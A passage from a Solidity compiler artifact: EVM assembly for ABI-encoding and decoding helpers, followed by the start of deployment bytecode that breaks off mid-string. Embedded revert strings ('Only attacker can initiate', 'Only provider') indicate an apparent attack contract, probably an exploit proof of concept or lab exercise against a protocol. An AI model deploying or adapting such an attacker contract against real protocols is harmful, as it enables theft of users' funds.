    /* \"#utility.yul\":436:473   */\n      tag_70\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:624   */\n    tag_72:\n        /* \"#utility.yul\":548:557   */\n      0x00\n        /* \"#utility.yul\":581:618   */\n      tag_107\n        /* \"#utility.yul\":612:617   */\n      dup3\n        /* \"#utility.yul\":581:618   */\n      tag_71\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":568:618   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:624   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":630:787   */\n    tag_73:\n        /* \"#utility.yul\":730:780   */\n      tag_109\n        /* \"#utility.yul\":774:779   */\n      dup2\n        /* \"#utility.yul\":730:780   */\n      tag_72\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":725:728   */\n      dup3\n        /* \"#utility.yul\":718:781   */\n      mstore\n        /* \"#utility.yul\":630:787   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":793:1041   */\n    tag_14:\n        /* \"#utility.yul\":899:903   */\n      0x00\n        /* \"#utility.yul\":937:939   */\n      0x20\n        /* \"#utility.yul\":926:935   */\n      dup3\n        /* \"#utility.yul\":922:940   */\n      add\n        /* \"#utility.yul\":914:940   */\n      swap1\n      pop\n        /* \"#utility.yul\":950:1034   */\n      tag_111\n        /* \"#utility.yul\":1031:1032   */\n      0x00\n        /* \"#utility.yul\":1020:1029   */\n      dup4\n        /* \"#utility.yul\":1016:1033   */\n      add\n        /* \"#utility.yul\":1007:1013   */\n      dup5\n        /* \"#utility.yul\":950:1034   */\n      tag_73\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":793:1041   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1047:1197   */\n    tag_74:\n        /* \"#utility.yul\":1121:1130   */\n      0x00\n        /* \"#utility.yul\":1154:1191   */\n      tag_113\n        /* \"#utility.yul\":1185:1190   */\n      dup3\n        /* \"#utility.yul\":1154:1191   */\n      tag_71\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":1141:1191   */\n      swap1\n      pop\n        /* \"#utility.yul\":1047:1197   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1203:1382   */\n    tag_75:\n        /* \"#utility.yul\":1314:1375   */\n      tag_115\n        /* \"#utility.yul\":1369:1374   */\n      dup2\n        /* \"#utility.yul\":1314:1375   */\n      tag_74\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":1309:1312   */\n      dup3\n        /* \"#utility.yul\":1302:1376   */\n      mstore\n        /* \"#utility.yul\":1203:1382   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1388:1658   */\n    tag_18:\n        /* \"#utility.yul\":1505:1509   */\n      0x00\n        /* \"#utility.yul\":1543:1545   */\n      0x20\n        /* \"#utility.yul\":1532:1541   */\n      dup3\n        /* \"#utility.yul\":1528:1546   */\n      add\n        /* \"#utility.yul\":1520:1546   */\n      swap1\n      pop\n        /* \"#utility.yul\":1556:1651   */\n      tag_117\n        /* \"#utility.yul\":1648:1649   */\n      0x00\n        /* \"#utility.yul\":1637:1646   */\n      dup4\n        /* \"#utility.yul\":1633:1650   */\n      add\n        /* \"#utility.yul\":1624:1630   */\n      dup5\n        /* \"#utility.yul\":1556:1651   */\n      tag_75\n      jump\t// in\n    tag_117:\n        /* \"#utility.yul\":1388:1658   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1664:1741   */\n    tag_76:\n        /* \"#utility.yul\":1701:1708   */\n      0x00\n        /* \"#utility.yul\":1730:1735   */\n      dup2\n        /* \"#utility.yul\":1719:1735   */\n      swap1\n      pop\n        /* \"#utility.yul\":1664:1741   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1747:1865   */\n    tag_77:\n        /* \"#utility.yul\":1834:1858   */\n      tag_120\n        /* \"#utility.yul\":1852:1857   */\n      dup2\n        /* \"#utility.yul\":1834:1858   */\n      tag_76\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":1829:1832   */\n      dup3\n        /* \"#utility.yul\":1822:1859   */\n      mstore\n        /* \"#utility.yul\":1747:1865   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1871:2093   */\n    tag_22:\n        /* \"#utility.yul\":1964:1968   */\n      0x00\n        /* \"#utility.yul\":2002:2004   */\n      0x20\n        /* \"#utility.yul\":1991:2000   */\n      dup3\n        /* \"#utility.yul\":1987:2005   */\n      add\n        /* \"#utility.yul\":1979:2005   */\n      swap1\n      pop\n        /* \"#utility.yul\":2015:2086   */\n      tag_122\n        /* \"#utility.yul\":2083:2084   */\n      0x00\n        /* \"#utility.yul\":2072:2081   */\n      dup4\n        /* \"#utility.yul\":2068:2085   */\n      add\n        /* \"#utility.yul\":2059:2065   */\n      dup5\n        /* \"#utility.yul\":2015:2086   */\n      tag_77\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":1871:2093   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2099:2195   */\n    tag_78:\n        /* \"#utility.yul\":2136:2143   */\n      0x00\n        /* \"#utility.yul\":2165:2189   */\n      tag_124\n        /* \"#utility.yul\":2183:2188   */\n      dup3\n        /* \"#utility.yul\":2165:2189   */\n      tag_68\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":2154:2189   */\n      swap1\n      pop\n        /* \"#utility.yul\":2099:2195   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2201:2319   */\n    tag_79:\n        /* \"#utility.yul\":2288:2312   */\n      tag_126\n        /* \"#utility.yul\":2306:2311   */\n      dup2\n        /* \"#utility.yul\":2288:2312   */\n      tag_78\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":2283:2286   */\n      dup3\n        /* \"#utility.yul\":2276:2313   */\n      mstore\n        /* \"#utility.yul\":2201:2319   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2325:2547   */\n    tag_26:\n        /* \"#utility.yul\":2418:2422   */\n      0x00\n        /* \"#utility.yul\":2456:2458   */\n      0x20\n        /* \"#utility.yul\":2445:2454   */\n      dup3\n        /* \"#utility.yul\":2441:2459   */\n      add\n        /* \"#utility.yul\":2433:2459   */\n      swap1\n      pop\n        /* \"#utility.yul\":2469:2540   */\n      tag_128\n        /* \"#utility.yul\":2537:2538   */\n      0x00\n        /* \"#utility.yul\":2526:2535   */\n      dup4\n        /* \"#utility.yul\":2522:2539   */\n      add\n        /* \"#utility.yul\":2513:2519   */\n      dup5\n        /* \"#utility.yul\":2469:2540   */\n      tag_79\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":2325:2547   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2553:2697   */\n    tag_80:\n        /* \"#utility.yul\":2621:2630   */\n      0x00\n        /* \"#utility.yul\":2654:2691   */\n      tag_130\n        /* \"#utility.yul\":2685:2690   */\n      dup3\n        /* \"#utility.yul\":2654:2691   */\n      tag_71\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":2641:2691   */\n      swap1\n      pop\n        /* \"#utility.yul\":2553:2697   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2703:2870   */\n    tag_81:\n        /* \"#utility.yul\":2808:2863   */\n      tag_132\n        /* \"#utility.yul\":2857:2862   */\n      dup2\n        /* \"#utility.yul\":2808:2863   */\n      tag_80\n      jump\t// in\n    tag_132:\n        /* \"#utility.yul\":2803:2806   */\n      dup3\n        /* \"#utility.yul\":2796:2864   */\n      mstore\n        /* \"#utility.yul\":2703:2870   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2876:3134   */\n    tag_30:\n        /* \"#utility.yul\":2987:2991   */\n      0x00\n        /* \"#utility.yul\":3025:3027   */\n      0x20\n        /* \"#utility.yul\":3014:3023   */\n      dup3\n        /* \"#utility.yul\":3010:3028   */\n      add\n        /* \"#utility.yul\":3002:3028   */\n      swap1\n      pop\n        /* \"#utility.yul\":3038:3127   */\n      tag_134\n        /* \"#utility.yul\":3124:3125   */\n      0x00\n        /* \"#utility.yul\":3113:3122   */\n      dup4\n        /* \"#utility.yul\":3109:3126   */\n      add\n        /* \"#utility.yul\":3100:3106   */\n      dup5\n        /* \"#utility.yul\":3038:3127   */\n      tag_81\n      jump\t// in\n    tag_134:\n        /* \"#utility.yul\":2876:3134   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3221:3338   */\n    tag_83:\n        /* \"#utility.yul\":3330:3331   */\n      0x00\n        /* \"#utility.yul\":3327:3328   */\n      0x00\n        /* \"#utility.yul\":3320:3332   */\n      revert\n        /* \"#utility.yul\":3467:3589   */\n    tag_85:\n        /* \"#utility.yul\":3540:3564   */\n      tag_139\n        /* \"#utility.yul\":3558:3563   */\n      dup2\n        /* \"#utility.yul\":3540:3564   */\n      tag_76\n      jump\t// in\n    tag_139:\n        /* \"#utility.yul\":3533:3538   */\n      dup2\n        /* \"#utility.yul\":3530:3565   */\n      eq\n        /* \"#utility.yul\":3520:3583   */\n      tag_140\n      jumpi\n        /* \"#utility.yul\":3579:3580   */\n      0x00\n        /* \"#utility.yul\":3576:3577   */\n      0x00\n        /* \"#utility.yul\":3569:3581   */\n      revert\n        /* \"#utility.yul\":3520:3583   */\n    tag_140:\n        /* \"#utility.yul\":3467:3589   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3595:3734   */\n    tag_86:\n        /* \"#utility.yul\":3641:3646   */\n      0x00\n        /* \"#utility.yul\":3679:3685   */\n      dup2\n        /* \"#utility.yul\":3666:3686   */\n      calldataload\n        /* \"#utility.yul\":3657:3686   */\n      swap1\n      pop\n        /* \"#utility.yul\":3695:3728   */\n      tag_142\n        /* \"#utility.yul\":3722:3727   */\n      dup2\n        /* \"#utility.yul\":3695:3728   */\n      tag_85\n      jump\t// in\n    tag_142:\n        /* \"#utility.yul\":3595:3734   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3740:4069   */\n    tag_33:\n        /* \"#utility.yul\":3799:3805   */\n      0x00\n        /* \"#utility.yul\":3848:3850   */\n      0x20\n        /* \"#utility.yul\":3836:3845   */\n      dup3\n        /* \"#utility.yul\":3827:3834   */\n      dup5\n        /* \"#utility.yul\":3823:3846   */\n      sub\n        /* \"#utility.yul\":3819:3851   */\n      slt\n        /* \"#utility.yul\":3816:3935   */\n      iszero\n      tag_144\n      jumpi\n        /* \"#utility.yul\":3854:3933   */\n      tag_145\n      tag_83\n      jump\t// in\n    tag_145:\n        /* \"#utility.yul\":3816:3935   */\n    tag_144:\n        /* \"#utility.yul\":3974:3975   */\n      0x00\n        /* \"#utility.yul\":3999:4052   */\n      tag_146\n        /* \"#utility.yul\":4044:4051   */\n      dup5\n        /* \"#utility.yul\":4035:4041   */\n      dup3\n        /* \"#utility.yul\":4024:4033   */\n      dup6\n        /* \"#utility.yul\":4020:4042   */\n      add\n        /* \"#utility.yul\":3999:4052   */\n      tag_86\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":3989:4052   */\n      swap2\n      pop\n        /* \"#utility.yul\":3945:4062   */\n      pop\n        /* \"#utility.yul\":3740:4069   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4075:4549   */\n    tag_37:\n        /* \"#utility.yul\":4143:4149   */\n      0x00\n        /* \"#utility.yul\":4151:4157   */\n      0x00\n        /* \"#utility.yul\":4200:4202   */\n      0x40\n        /* \"#utility.yul\":4188:4197   */\n      dup4\n        /* \"#utility.yul\":4179:4186   */\n      dup6\n        /* \"#utility.yul\":4175:4198   */\n      sub\n        /* \"#utility.yul\":4171:4203   */\n      slt\n        /* \"#utility.yul\":4168:4287   */\n      iszero\n      tag_148\n      jumpi\n        /* \"#utility.yul\":4206:4285   */\n      tag_149\n      tag_83\n      jump\t// in\n    tag_149:\n        /* \"#utility.yul\":4168:4287   */\n    tag_148:\n        /* \"#utility.yul\":4326:4327   */\n      0x00\n        /* \"#utility.yul\":4351:4404   */\n      tag_150\n        /* \"#utility.yul\":4396:4403   */\n      dup6\n        /* \"#utility.yul\":4387:4393   */\n      dup3\n        /* \"#utility.yul\":4376:4385   */\n      dup7\n        /* \"#utility.yul\":4372:4394   */\n      add\n        /* \"#utility.yul\":4351:4404   */\n      tag_86\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":4341:4404   */\n      swap3\n      pop\n        /* \"#utility.yul\":4297:4414   */\n      pop\n        /* \"#utility.yul\":4453:4455   */\n      0x20\n        /* \"#utility.yul\":4479:4532   */\n      tag_151\n        /* \"#utility.yul\":4524:4531   */\n      dup6\n        /* \"#utility.yul\":4515:4521   */\n      dup3\n        /* \"#utility.yul\":4504:4513   */\n      dup7\n        /* \"#utility.yul\":4500:4522   */\n      add\n        /* \"#utility.yul\":4479:4532   */\n      tag_86\n      jump\t// in\n    tag_151:\n        /* \"#utility.yul\":4469:4532   */\n      swap2\n      pop\n        /* \"#utility.yul\":4424:4542   */\n      pop\n        /* \"#utility.yul\":4075:4549   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4555:4724   */\n    tag_87:\n        /* \"#utility.yul\":4639:4650   */\n      0x00\n        /* \"#utility.yul\":4673:4679   */\n      dup3\n        /* \"#utility.yul\":4668:4671   */\n      dup3\n        /* \"#utility.yul\":4661:4680   */\n      mstore\n        /* \"#utility.yul\":4713:4717   */\n      0x20\n        /* \"#utility.yul\":4708:4711   */\n      dup3\n        /* \"#utility.yul\":4704:4718   */\n      add\n        /* \"#utility.yul\":4689:4718   */\n      swap1\n      pop\n        /* \"#utility.yul\":4555:4724   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4730:4906   */\n    tag_88:\n        /* \"#utility.yul\":4870:4898   */\n      0x4f6e6c792061747461636b65722063616e20696e697469617465000000000000\n        /* \"#utility.yul\":4866:4867   */\n      0x00\n        /* \"#utility.yul\":4858:4864   */\n      dup3\n        /* \"#utility.yul\":4854:4868   */\n      add\n        /* \"#utility.yul\":4847:4899   */\n      mstore\n        /* \"#utility.yul\":4730:4906   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4912:5278   */\n    tag_89:\n        /* \"#utility.yul\":5054:5057   */\n      0x00\n        /* \"#utility.yul\":5075:5142   */\n      tag_155\n        /* \"#utility.yul\":5139:5141   */\n      0x1a\n        /* \"#utility.yul\":5134:5137   */\n      dup4\n        /* \"#utility.yul\":5075:5142   */\n      tag_87\n      jump\t// in\n    tag_155:\n        /* \"#utility.yul\":5068:5142   */\n      swap2\n      pop\n        /* \"#utility.yul\":5151:5244   */\n      tag_156\n        /* \"#utility.yul\":5240:5243   */\n      dup3\n        /* \"#utility.yul\":5151:5244   */\n      tag_88\n      jump\t// in\n    tag_156:\n        /* \"#utility.yul\":5269:5271   */\n      0x20\n        /* \"#utility.yul\":5264:5267   */\n      dup3\n        /* \"#utility.yul\":5260:5272   */\n      add\n        /* \"#utility.yul\":5253:5272   */\n      swap1\n      pop\n        /* \"#utility.yul\":4912:5278   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5284:5703   */\n    tag_42:\n        /* \"#utility.yul\":5450:5454   */\n      0x00\n        /* \"#utility.yul\":5488:5490   */\n      0x20\n        /* \"#utility.yul\":5477:5486   */\n      dup3\n        /* \"#utility.yul\":5473:5491   */\n      add\n        /* \"#utility.yul\":5465:5491   */\n      swap1\n      pop\n        /* \"#utility.yul\":5537:5546   */\n      dup2\n        /* \"#utility.yul\":5531:5535   */\n      dup2\n        /* \"#utility.yul\":5527:5547   */\n      sub\n        /* \"#utility.yul\":5523:5524   */\n      0x00\n        /* \"#utility.yul\":5512:5521   */\n      dup4\n        /* \"#utility.yul\":5508:5525   */\n      add\n        /* \"#utility.yul\":5501:5548   */\n      mstore\n        /* \"#utility.yul\":5565:5696   */\n      tag_158\n        /* \"#utility.yul\":5691:5695   */\n      dup2\n        /* \"#utility.yul\":5565:5696   */\n      tag_89\n      jump\t// in\n    tag_158:\n        /* \"#utility.yul\":5557:5696   */\n      swap1\n      pop\n        /* \"#utility.yul\":5284:5703   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5709:5872   */\n    tag_90:\n        /* \"#utility.yul\":5849:5864   */\n      0x4f6e6c792070726f766964657200000000000000000000000000000000000000\n        /* \"#utility.yul\":5845:5846   */\n      0x00\n        /* \"#utility.yul\":5837:5843   */\n      dup3\n        /* \"#utility.yul\":5833:5847   */\n      add\n        /* \"#utility.yul\":5826:5865   */\n      mstore\n        /* \"#utility.yul\":5709:5872   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5878:6244   */\n    tag_91:\n        /* \"#utility.yul\":6020:6023   */\n      0x00\n        /* \"#utility.yul\":6041:6108   */\n      tag_161\n        /* \"#utility.yul\":6105:6107   */\n      0x0d\n        /* \"#utility.yul\":6100:6103   */\n      dup4\n        /* \"#utility.yul\":6041:6108   */\n      tag_87\n      jump\t// in\n    tag_161:\n        /* \"#utility.yul\":6034:6108   */\n      swap2\n      pop\n        /* \"#utility.yul\":6117:6210   */\n      tag_162\n        /* \"#utility.yul\":6206:6209   */\n      dup3\n        /* \"#utility.yul\":6117:6210   */\n      tag_90\n      jump\t// in\n    tag_162:\n        /* \"#utility.yul\":6235:6237   */\n      0x20\n        /* \"#utility.yul\":6230:6233   */\n      dup3\n        /* \"#utility.yul\":6226:6238   */\n      add\n        /* \"#utility.yul\":6219:6238   */\n      swap1\n      pop\n        /* \"#utility.yul\":5878:6244   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6250:6669   */\n    tag_50:\n        /* \"#utility.yul\":6416:6420   */\n      0x00\n        /* \"#utility.yul\":6454:6456   */\n      0x20\n        /* \"#utility.yul\":6443:6452   */\n      dup3\n        /* \"#utility.yul\":6439:6457   */\n      add\n        /* \"#utility.yul\":6431:6457   */\n      swap1\n      pop\n        /* \"#utility.yul\":6503:6512   */\n      dup2\n        /* \"#utility.yul\":6497:6501   */\n      dup2\n        /* \"#utility.yul\":6493:6513   */\n      sub\n        /* \"#utility.yul\":6489:6490   */\n      0x00\n        /* \"#utility.yul\":6478:6487   */\n      dup4\n        /* \"#utility.yul\":6474:6491   */\n      add\n        /* \"#utility.yul\":6467:6514   */\n      mstore\n        /* \"#utility.yul\":6531:6662   */\n      tag_164\n        /* \"#utility.yul\":6657:6661   */\n      dup2\n        /* \"#utility.yul\":6531:6662   */\n      tag_91\n      jump\t// in\n    tag_164:\n        /* \"#utility.yul\":6523:6662   */\n      swap1\n      pop\n        /* \"#utility.yul\":6250:6669   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6675:7007   */\n    tag_52:\n        /* \"#utility.yul\":6796:6800   */\n      0x00\n        /* \"#utility.yul\":6834:6836   */\n      0x40\n        /* \"#utility.yul\":6823:6832   */\n      dup3\n        /* \"#utility.yul\":6819:6837   */\n      add\n        /* \"#utility.yul\":6811:6837   */\n      swap1\n      pop\n        /* \"#utility.yul\":6847:6918   */\n      tag_166\n        /* \"#utility.yul\":6915:6916   */\n      0x00\n        /* \"#utility.yul\":6904:6913   */\n      dup4\n        /* \"#utility.yul\":6900:6917   */\n      add\n        /* \"#utility.yul\":6891:6897   */\n      dup6\n        /* \"#utility.yul\":6847:6918   */\n      tag_79\n      jump\t// in\n    tag_166:\n        /* \"#utility.yul\":6928:7000   */\n      tag_167\n        /* \"#utility.yul\":6996:6998   */\n      0x20\n        /* \"#utility.yul\":6985:6994   */\n      dup4\n        /* \"#utility.yul\":6981:6999   */\n      add\n        /* \"#utility.yul\":6972:6978   */\n      dup5\n        /* \"#utility.yul\":6928:7000   */\n      tag_77\n      jump\t// in\n    tag_167:\n        /* \"#utility.yul\":6675:7007   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7013:7103   */\n    tag_92:\n        /* \"#utility.yul\":7047:7054   */\n      0x00\n        /* \"#utility.yul\":7090:7095   */\n      dup2\n        /* \"#utility.yul\":7083:7096   */\n      iszero\n        /* \"#utility.yul\":7076:7097   */\n      iszero\n        /* \"#utility.yul\":7065:7097   */\n      swap1\n      pop\n        /* \"#utility.yul\":7013:7103   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7109:7225   */\n    tag_93:\n        /* \"#utility.yul\":7179:7200   */\n      tag_170\n        /* \"#utility.yul\":7194:7199   */\n      dup2\n        /* \"#utility.yul\":7179:7200   */\n      tag_92\n      jump\t// in\n    tag_170:\n        /* \"#utility.yul\":7172:7177   */\n      dup2\n        /* \"#utility.yul\":7169:7201   */\n      eq\n        /* \"#utility.yul\":7159:7219   */\n      tag_171\n      jumpi\n        /* \"#utility.yul\":7215:7216   */\n      0x00\n        /* \"#utility.yul\":7212:7213   */\n      0x00\n        /* \"#utility.yul\":7205:7217   */\n      revert\n        /* \"#utility.yul\":7159:7219   */\n    tag_171:\n        /* \"#utility.yul\":7109:7225   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7231:7368   */\n    tag_94:\n        /* \"#utility.yul\":7285:7290   */\n      0x00\n        /* \"#utility.yul\":7316:7322   */\n      dup2\n        /* \"#utility.yul\":7310:7323   */\n      mload\n        /* \"#utility.yul\":7301:7323   */\n      swap1\n      pop\n        /* \"#utility.yul\":7332:7362   */\n      tag_173\n        /* \"#utility.yul\":7356:7361   */\n      dup2\n        /* \"#utility.yul\":7332:7362   */\n      tag_93\n      jump\t// in\n    tag_173:\n        /* \"#utility.yul\":7231:7368   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7374:7719   */\n    tag_56:\n        /* \"#utility.yul\":7441:7447   */\n      0x00\n        /* \"#utility.yul\":7490:7492   */\n      0x20\n        /* \"#utility.yul\":7478:7487   */\n      dup3\n        /* \"#utility.yul\":7469:7476   */\n      dup5\n        /* \"#utility.yul\":7465:7488   */\n      sub\n        /* \"#utility.yul\":7461:7493   */\n      slt\n        /* \"#utility.yul\":7458:7577   */\n      iszero\n      tag_175\n      jumpi\n        /* \"#utility.yul\":7496:7575   */\n      tag_176\n      tag_83\n      jump\t// in\n    tag_176:\n        /* \"#utility.yul\":7458:7577   */\n    tag_175:\n        /* \"#utility.yul\":7616:7617   */\n      0x00\n        /* \"#utility.yul\":7641:7702   */\n      tag_177\n        /* \"#utility.yul\":7694:7701   */\n      dup5\n        /* \"#utility.yul\":7685:7691   */\n      dup3\n        /* \"#utility.yul\":7674:7683   */\n      dup6\n        /* \"#utility.yul\":7670:7692   */\n      add\n        /* \"#utility.yul\":7641:7702   */\n      tag_94\n      jump\t// in\n    tag_177:\n        /* \"#utility.yul\":7631:7702   */\n      swap2\n      pop\n        /* \"#utility.yul\":7587:7712   */\n      pop\n        /* \"#utility.yul\":7374:7719   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7725:7834   */\n    tag_95:\n        /* \"#utility.yul\":7806:7827   */\n      tag_179\n        /* \"#utility.yul\":7821:7826   */\n      dup2\n        /* \"#utility.yul\":7806:7827   */\n      tag_92\n      jump\t// in\n    tag_179:\n        /* \"#utility.yul\":7801:7804   */\n      dup3\n        /* \"#utility.yul\":7794:7828   */\n      mstore\n        /* \"#utility.yul\":7725:7834   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7840:8160   */\n    tag_58:\n        /* \"#utility.yul\":7955:7959   */\n      0x00\n        /* \"#utility.yul\":7993:7995   */\n      0x40\n        /* \"#utility.yul\":7982:7991   */\n      dup3\n        /* \"#utility.yul\":7978:7996   */\n      add\n        /* \"#utility.yul\":7970:7996   */\n      swap1\n      pop\n        /* \"#utility.yul\":8006:8077   */\n      tag_181\n        /* \"#utility.yul\":8074:8075   */\n      0x00\n        /* \"#utility.yul\":8063:8072   */\n      dup4\n        /* \"#utility.yul\":8059:8076   */\n      add\n        /* \"#utility.yul\":8050:8056   */\n      dup6\n        /* \"#utility.yul\":8006:8077   */\n      tag_77\n      jump\t// in\n    tag_181:\n        /* \"#utility.yul\":8087:8153   */\n      tag_182\n        /* \"#utility.yul\":8149:8151   */\n      0x20\n        /* \"#utility.yul\":8138:8147   */\n      dup4\n        /* \"#utility.yul\":8134:8152   */\n      add\n        /* \"#utility.yul\":8125:8131   */\n      dup5\n        /* \"#utility.yul\":8087:8153   */\n      tag_95\n      jump\t// in\n    tag_182:\n        /* \"#utility.yul\":7840:8160   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8166:8346   */\n    tag_96:\n        /* \"#utility.yul\":8214:8291   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":8211:8212   */\n      0x00\n        /* \"#utility.yul\":8204:8292   */\n      mstore\n        /* \"#utility.yul\":8311:8315   */\n      0x11\n        /* \"#utility.yul\":8308:8309   */\n      0x04\n        /* \"#utility.yul\":8301:8316   */\n      mstore\n        /* \"#utility.yul\":8335:8339   */\n      0x24\n        /* \"#utility.yul\":8332:8333   */\n      0x00\n        /* \"#utility.yul\":8325:8340   */\n      revert\n        /* \"#utility.yul\":8352:8543   */\n    tag_63:\n        /* \"#utility.yul\":8392:8395   */\n      0x00\n        /* \"#utility.yul\":8411:8431   */\n      tag_185\n        /* \"#utility.yul\":8429:8430   */\n      dup3\n        /* \"#utility.yul\":8411:8431   */\n      tag_76\n      jump\t// in\n    tag_185:\n        /* \"#utility.yul\":8406:8431   */\n      swap2\n      pop\n        /* \"#utility.yul\":8445:8465   */\n      tag_186\n        /* \"#utility.yul\":8463:8464   */\n      dup4\n        /* \"#utility.yul\":8445:8465   */\n      tag_76\n      jump\t// in\n    tag_186:\n        /* \"#utility.yul\":8440:8465   */\n      swap3\n      pop\n        /* \"#utility.yul\":8488:8489   */\n      dup3\n        /* \"#utility.yul\":8485:8486   */\n      dup3\n        /* \"#utility.yul\":8481:8490   */\n      add\n        /* \"#utility.yul\":8474:8490   */\n      swap1\n      pop\n        /* \"#utility.yul\":8509:8512   */\n      dup1\n        /* \"#utility.yul\":8506:8507   */\n      dup3\n        /* \"#utility.yul\":8503:8513   */\n      gt\n        /* \"#utility.yul\":8500:8536   */\n      iszero\n      tag_187\n      jumpi\n        /* \"#utility.yul\":8516:8534   */\n      tag_188\n      tag_96\n      jump\t// in\n    tag_188:\n        /* \"#utility.yul\":8500:8536   */\n    tag_187:\n        /* \"#utility.yul\":8352:8543   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220eb75acd1d9b416ec12cd9b00101521e6bb65014efb1c55758eea67a59498f00364736f6c634300081d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b50604051610cc0380380610cc08339818101604052810190610031919061025c565b8260015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550815f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a530cbf16040518163ffffffff1660e01b8152600401602060405180830381865afa158015610119573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013d91906102ac565b60025f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806003819055503360045f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050506102d7565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101f8826101cf565b9050919050565b610208816101ee565b8114610212575f5ffd5b50565b5f81519050610223816101ff565b92915050565b5f819050919050565b61023b81610229565b8114610245575f5ffd5b50565b5f8151905061025681610232565b92915050565b5f5f5f60608486031215610273576102726101cb565b5b5f61028086828701610215565b935050602061029186828701610215565b92505060406102a286828701610248565b9150509250925092565b5f602082840312156102c1576102c06101cb565b5b5f6102ce84828501610215565b91505092915050565b6109dc806102e45f395ff3fe608060405234801561000f575f5ffd5b506004361061007b575f3560e01c806348eb76ee1161005957806348eb76ee146100d95780635aa6e675146100f757806364dd891a1461011557806384f0e272146101315761007b565b806305268cff1461007f578063085d48831461009d5780632dfca445146100bb575b5f5ffd5b61008761014d565b604051610094919061061d565b60405180910390f35b6100a5610172565b6040516100b29190610656565b60405180910390f35b6100c3610197565b6040516100d09190610687565b60405180910390f35b6100e161019d565b6040516100ee91906106c0565b60405180910390f35b6100ff6101c2565b60405161010c91906106f9565b60405180910390f35b61012f600480360381019061012a9190610740565b6101e6565b005b61014b6004803603810190610146919061076b565b6102ff565b005b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60035481565b60045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610275